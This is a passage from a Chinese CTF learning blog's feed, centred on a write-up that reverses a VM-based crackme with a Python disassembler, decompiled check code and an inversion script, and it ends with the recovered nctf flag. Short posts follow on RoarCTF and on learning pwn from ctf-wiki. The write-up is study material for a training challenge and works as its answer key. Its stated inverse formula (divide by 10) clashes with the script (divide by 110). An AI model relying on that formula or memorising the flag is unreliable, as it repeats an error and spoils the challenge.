class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x46</span>,<span class="number">0xe</span>,<span class="number">0x15</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,<span class="number">0x2</span>,<span class="number">0xb</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0xa</span>,<span class="number">0x2</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x47</span>,<span class="number">0xe</span>,<span class="number">0x46</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x1a</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0x14</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1b</span>,<span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x6e</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x63</span>,<span class="number">0x15</span>,<span class="number">0x1</span>,<span class="number">0x74</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x22</span>,<span class="number">0x64</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">//后面是多输出的，不过可忽略！  取上面就好！</span></span><br><span class="line"><span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br></pre></td></tr></table></figure><h4 id="gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，"><a href="#gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，" class="headerlink" title="&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，"></a>&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，</h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x46</span>,<span class="number">0xe</span>,<span class="number">0x15</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,</span><br><span class="line">     <span class="number">0x9</span>,<span class="number">0x2</span>,<span class="number">0xb</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0xa</span>,<span class="number">0x2</span>,<span class="number">0x9</span>,<span class="number">0x1</span>,<span class="number">0x11</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,</span><br><span class="line">     <span class="number">0x47</span>,<span class="number">0xe</span>,<span class="number">0x46</span>,<span class="number">0xa</span>,<span class="number">0x1</span>,<span class="number">0x1a</span>,<span class="number">0x2</span>,<span class="number">0x6</span>,<span class="number">0x1d</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x4</span>,<span class="number">0x14</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x19</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x1b</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x1</span>,<span class="number">0x1d</span>,<span class="number">0x1</span>,<span class="number">0x6e</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x63</span>,<span class="number">0x15</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x74</span>,<span class="number">0x13</span>,<span class="number">0x1</span>,<span class="number">0x66</span>,<span class="number">0x1c</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x9</span>,</span><br><span class="line">     <span class="number">0x1</span>,<span class="number">0x11</span>,<span class="number">0x1</span>,<span class="number">0xd</span>,<span class="number">0x1</span>,<span class="number">0x3</span>,<span class="number">0xf</span>,<span class="number">0x22</span>,<span class="number">0x64</span>]</span><br><span class="line"><span class="built_in">i</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">i</span> &lt; len(arr)):</span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">8</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">9</span>):</span><br><span class="line">        print(<span class="string">'%d   pop R%d'</span><span class="comment">%(i, arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">10</span>):</span><br><span class="line">        print(<span class="string">'%d   push R%d'</span><span class="comment">%(i, arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">11</span>):</span><br><span class="line">        print(<span class="string">'%d   R0 = getchar()'</span><span class="comment">%i)</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">12</span>):</span><br><span class="line">        print(<span class="string">'%d   R0  = putchar()'</span><span class="comment">%i)</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">13</span>):</span><br><span class="line">        print(<span class="string">"     cmp R%d, R%d\n"</span><span class="comment">%(arr[i+1]-1, arr[i+2]-1),</span></span><br><span class="line">              <span class="string">"    jnz %d\n"</span><span class="comment">%(i+3),</span></span><br><span class="line">              <span class="string">"    mov a, 80"</span>)</span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">14</span>):</span><br><span class="line">        print(<span class="string">'%d   jmp %d'</span><span class="comment">%(i,arr[i+1]))</span></span><br><span class="line">        <span class="built_in">i</span> +=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">15</span>):</span><br><span class="line">        print(<span class="string">"%d"</span><span class="comment">%i,</span></span><br><span class="line">              <span class="string">" and a, 0x80\n"</span></span><br><span class="line">              <span class="string">"     test a\n"</span></span><br><span class="line">              <span class="string">"     jnz %d"</span><span class="comment">%arr[i+1])</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">16</span>):</span><br><span class="line">        print(<span class="string">"%d"</span><span class="comment">%i,</span></span><br><span class="line">              <span class="string">" and a, 0x80\n"</span></span><br><span class="line">              <span class="string">"     test a\n"</span>,</span><br><span class="line">              <span class="string">"     jnz %d"</span><span class="comment">%arr[i+2])</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span>    </span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">17</span>):</span><br><span class="line">        print(<span class="string">'%d   inc R%d'</span><span class="comment">%(i,arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">18</span>):</span><br><span class="line">        print(<span class="string">'%d   dec R%d'</span><span class="comment">%(i,arr[i+1]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">19</span>):</span><br><span class="line">        print(<span class="string">"%d   add R%d, %d"</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">20</span>):</span><br><span class="line">        print(<span class="string">'%d   sub R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2] - 1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">21</span>):</span><br><span class="line">        print(<span class="string">'%d   xor R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">22</span>):</span><br><span class="line">        print(<span class="string">'%d   and R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">23</span>):</span><br><span class="line">        print(<span class="string">'%d   or R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">25</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">26</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">27</span>):</span><br><span class="line">        print(<span class="string">'%d   mov R%d, [R%d]'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">28</span>):</span><br><span class="line">        print(<span class="string">'%d   mov [R%d], R%d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]-1))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br><span class="line">    <span class="keyword">if</span>(arr[<span class="built_in">i</span>] == <span class="number">29</span>):</span><br><span class="line">        print(<span class="string">'%d   mul R%d, %d'</span><span class="comment">%(i, arr[i+1]-1, arr[i+2]))</span></span><br><span class="line">        <span class="built_in">i</span> += <span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="执行结果（我们稍加加入一些理解性的注释）"><a href="#执行结果（我们稍加加入一些理解性的注释）" class="headerlink" title="执行结果（我们稍加加入一些理解性的注释）"></a>执行结果（我们稍加加入一些理解性的注释）</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">3</span>   <span class="keyword">mov</span> <span class="built_in">R2</span>, <span class="number">70</span></span><br><span class="line"><span class="number">6</span>   <span class="keyword">jmp</span> <span class="number">21</span>_____________________________________________________</span><br><span class="line"><span class="number">8</span>   <span class="keyword">push</span> <span class="built_in">R0</span>//下面这些代码是获取  <span class="number">70</span>字符的输入</span><br><span class="line"><span class="number">10</span>   <span class="keyword">pop</span> <span class="built_in">R1</span></span><br><span class="line"><span class="number">12</span>   <span class="built_in">R0</span> = getchar()</span><br><span class="line"><span class="number">13</span>   <span class="keyword">push</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">15</span>   <span class="keyword">push</span> <span class="built_in">R1</span></span><br><span class="line"><span class="number">17</span>   <span class="keyword">pop</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">19</span>   <span class="keyword">inc</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">21</span>     <span class="keyword">cmp</span> <span class="built_in">R0</span>, <span class="built_in">R2</span></span><br><span class="line">   <span class="keyword">jnz</span> <span class="number">24</span></span><br><span class="line">   <span class="keyword">mov</span> a, <span class="number">80</span></span><br><span class="line"><span class="number">24</span> <span class="keyword">and</span> a, <span class="number">0x80</span></span><br><span class="line"> <span class="keyword">test</span> a</span><br><span class="line"> <span class="keyword">jnz</span> <span class="number">8</span></span><br><span class="line"><span class="number">26</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">29</span>   <span class="keyword">mov</span> <span class="built_in">R2</span>, <span class="number">71</span></span><br><span class="line"><span class="number">32</span>   <span class="keyword">jmp</span> <span class="number">70________________________________________________________________</span></span><br><span class="line"><span class="number">34</span>   <span class="keyword">push</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">36</span>   <span class="keyword">mov</span> <span class="built_in">R1</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="number">39</span>   <span class="keyword">mul</span> <span class="built_in">R0</span>, <span class="number">4</span></span><br><span class="line"><span class="number">42</span>   <span class="keyword">sub</span> <span class="built_in">R1</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="number">45</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="number">48</span>   <span class="keyword">mov</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>]_________________________________________________________</span><br><span class="line"><span class="number">51</span>   <span class="keyword">mul</span> <span class="built_in">R0</span>, <span class="number">110</span></span><br><span class="line"><span class="number">54</span>   <span class="keyword">add</span> <span class="built_in">R0</span>, <span class="number">99</span></span><br><span class="line"><span class="number">57</span>   <span class="keyword">xor</span> <span class="built_in">R0</span>, <span class="number">116</span>这四行代码 即关键算法是 ： (((<span class="built_in">R0</span>*<span class="number">110</span>）+<span class="number">99</span>)^<span class="number">116</span>)+<span class="number">102</span></span><br><span class="line"><span class="number">60</span>   <span class="keyword">add</span> <span class="built_in">R0</span>, <span class="number">102_________________________________________________________</span></span><br><span class="line"><span class="number">63</span>   <span class="keyword">mov</span> [<span class="built_in">R1</span>], <span class="built_in">R0</span></span><br><span class="line"><span class="number">66</span>   <span class="keyword">pop</span> <span class="built_in">R0</span></span><br><span class="line"><span class="number">68</span>   <span class="keyword">inc</span> <span class="built_in">R0</span></span><br><span class="line">(<span class="string">'     cmp R0, R2\n'</span>, <span class="string">'    jnz 73\n'</span>, <span class="string">'    mov a, 80'</span>)</span><br><span class="line">(<span class="string">'73'</span>, <span class="string">' and a, 0x80\n     test a\n     jnz 34'</span>)</span><br></pre></td></tr></table></figure><h4 id="我们再分析下-case-100："><a href="#我们再分析下-case-100：" class="headerlink" title="我们再分析下  case 100："></a>我们再分析下  case 100：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">sub_400D59</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">69</span>; ++i )</span><br><span class="line">    v3 |= word_6020A0[i] != *(_DWORD *)(<span class="number">4L</span>L * i - <span class="number">280</span> + a1);</span><br><span class="line">  <span class="keyword">return</span> v3 == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0 | 任何都等于任何，所以    v3=word_6020A0指向的数据</p></blockquote><h4 id="我们用ida将它跑出来"><a href="#我们用ida将它跑出来" class="headerlink" title="我们用ida将它跑出来"></a>我们用ida将它跑出来</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14035</span>,<span class="number">11007</span>,<span class="number">10955</span>,<span class="number">11157</span>,<span class="number">11157</span>,<span class="number">11157</span>,<span class="number">5791</span>,<span class="number">6253</span>,<span class="number">6359</span>,<span class="number">5649</span>,<span class="number">6359</span>,<span class="number">11157</span>,<span class="number">11299</span>,<span class="number">11433</span>,<span class="number">5649</span>,<span class="number">5649</span>,<span class="number">6359</span>,<span class="number">11007</span>,<span class="number">6217</span>,<span class="number">6395</span>,<span class="number">10955</span>,<span class="number">10865</span>,<span class="number">5941</span>,<span class="number">6359</span>,<span class="number">5649</span>,<span class="number">10955</span>,<span class="number">5597</span>,<span class="number">6359</span>,<span class="number">11299</span>,<span class="number">5791</span>,<span class="number">5597</span>,<span class="number">11157</span>,<span class="number">5791</span>,<span class="number">5483</span>,<span class="number">6253</span>,<span class="number">11007</span>,<span class="number">5649</span>,<span class="number">5649</span>,<span class="number">5597</span>,<span class="number">11007</span>,<span class="number">11299</span>,<span class="number">10955</span>,<span class="number">5597</span>,<span class="number">5597</span>,<span class="number">6253</span>,<span class="number">6217</span>,<span class="number">11157</span>,<span class="number">5483</span>,<span class="number">5941</span>,<span class="number">6395</span>,<span class="number">6395</span>,<span class="number">10865</span>,<span class="number">11007</span>,<span class="number">5941</span>,<span class="number">11299</span>,<span class="number">5597</span>,<span class="number">6359</span>,<span class="number">10865</span>,<span class="number">6359</span>,<span class="number">6359</span>,<span class="number">11299</span>,<span class="number">11007</span>,<span class="number">5483</span>,<span class="number">11299</span>,<span class="number">5791</span>,<span class="number">13743</span>,<span class="number">11433</span>,<span class="number">12981</span>,<span class="number">11007</span>,<span class="number">12345</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br></pre></td></tr></table></figure><blockquote><p>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>我们输入的字符串（需要逆推出来的flag）通过关键运算 后 要与 v3相等，</p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((R0*<span class="number">110</span>）+<span class="number">99</span>)^<span class="number">116</span>)+<span class="number">102</span>=V3的逆算法为：R0=（((v3<span class="number">-102</span>)^<span class="number">116</span>)<span class="number">-99</span>）/<span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>于是写  python脚本：</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v3=[<span class="number">14035,11007</span>,<span class="number">10955,11157</span>,<span class="number">11157,11157</span>,<span class="number">5791,6253</span>,<span class="number">6359,5649</span>,<span class="number">6359,11157</span>,<span class="number">11299,11433</span>,<span class="number">5649,5649</span>,<span class="number">6359,11007</span>,<span class="number">6217,6395</span>,<span class="number">10955,10865</span>,<span class="number">5941,6359</span>,<span class="number">5649,10955</span>,<span class="number">5597,6359</span>,<span class="number">11299,5791</span>,<span class="number">5597,11157</span>,<span class="number">5791,5483</span>,<span class="number">6253,11007</span>,<span class="number">5649,5649</span>,<span class="number">5597,11007</span>,<span class="number">11299,10955</span>,<span class="number">5597,5597</span>,<span class="number">6253,6217</span>,<span class="number">11157,5483</span>,<span class="number">5941,6395</span>,<span class="number">6395,10865</span>,<span class="number">11007,5941</span>,<span class="number">11299,5597</span>,<span class="number">6359,10865</span>,<span class="number">6359,6359</span>,<span class="number">11299,11007</span>,<span class="number">5483,11299</span>,<span class="number">5791,13743</span>,<span class="number">11433,12981</span>,<span class="number">11007,12345</span>]</span><br><span class="line">flag=""</span><br><span class="line"></span><br><span class="line">#print len(v3)#<span class="number">70</span></span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">flag+=chr((((v3[i]-<span class="number">102</span>)^<span class="number">116</span>)-<span class="number">99</span>)/<span class="number">110</span>)</span><br><span class="line">#print flag</span><br><span class="line">print flag[::-<span class="number">1</span>]</span><br><span class="line">#nctf&#123;<span class="number">3</span>e1ce77b70e4cb9941d6800aec022c813d03e70a274ba96c722fed72783dddac&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>汇编有待提高，另外逆向才学习到一点皮毛！要努力了！<br><img src="https://s2.ax1x.com/2019/10/12/uXY2EF.jpg" alt="uXY2EF.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！&lt;br&gt;VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，&lt;br&gt;第一次做VM，记录下&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>RoarCTF</title>
    <link href="http://yoursite.com/2019/10/13/RoarCTF/"/>
    <id>http://yoursite.com/2019/10/13/RoarCTF/</id>
    <published>2019-10-13T15:34:11.000Z</published>
    <updated>2019-10-13T15:35:01.665Z</updated>
    
    <content type="html"><![CDATA[<p>太弱了！</p><a id="more"></a><h1 id="被打惨了！没心情了，额额额！"><a href="#被打惨了！没心情了，额额额！" class="headerlink" title="被打惨了！没心情了，额额额！"></a>被打惨了！没心情了，额额额！</h1><p><img src="https://s2.ax1x.com/2019/09/19/nOs2TJ.jpg" alt="nOs2TJ.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太弱了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>照着ctfwiki就够了</title>
    <link href="http://yoursite.com/2019/10/11/%E7%85%A7%E7%9D%80ctfwiki%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
    <id>http://yoursite.com/2019/10/11/照着ctfwiki就够了/</id>
    <published>2019-10-11T10:44:26.000Z</published>
    <updated>2019-10-12T11:10:43.683Z</updated>
    
    <content type="html"><![CDATA[<p>早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！</p><a id="more"></a><h1 id="一筐萝卜曰："><a href="#一筐萝卜曰：" class="headerlink" title="一筐萝卜曰："></a>一筐萝卜曰：</h1><blockquote><p>他当时也就是照ctfwiki学的，不用在网上找其它的教程之类的，这个网站的内容很优质！</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>ctf-wiki.github.io<span class="regexp">/ctf-wiki/</span></span><br></pre></td></tr></table></figure><blockquote><p>但我之前看过了ctfWiki，但当时真的是看不懂，我是在网上却照着wp上学的，今天呢，又重新好好看看了ctfwiki，或许是练习十天后的结果吧，真看下去的话是能够看懂其实，（或许是之前学了段逆向的原因！理解的还算是很清晰，ctfwiki的内容确实很优质！）,以后就以这个为总线学习吧！<br>另外，刚开始的pwn中缓冲区溢出，这个链接也很优质：<a href="https://zhuanlan.zhihu.com/chaitin-tech" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/chaitin-tech</a></p></blockquote><h1 id="小结：pwn还是挺好玩的！哈哈！"><a href="#小结：pwn还是挺好玩的！哈哈！" class="headerlink" title="小结：pwn还是挺好玩的！哈哈！"></a>小结：pwn还是挺好玩的！哈哈！</h1><p><img src="https://s2.ax1x.com/2019/10/12/uXYW4J.jpg" alt="uXYW4J.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;早在很久前就听组长说过pwn了，但当时刚接触二进制，觉得逆向就很难入门了，一直拖到国庆节才开始学pwn，嗯…,还来的及，学就行了！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn05</title>
    <link href="http://yoursite.com/2019/10/10/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn05/"/>
    <id>http://yoursite.com/2019/10/10/国庆七天之pwn05/</id>
    <published>2019-10-10T15:25:02.000Z</published>
    <updated>2019-10-12T10:41:43.182Z</updated>
    
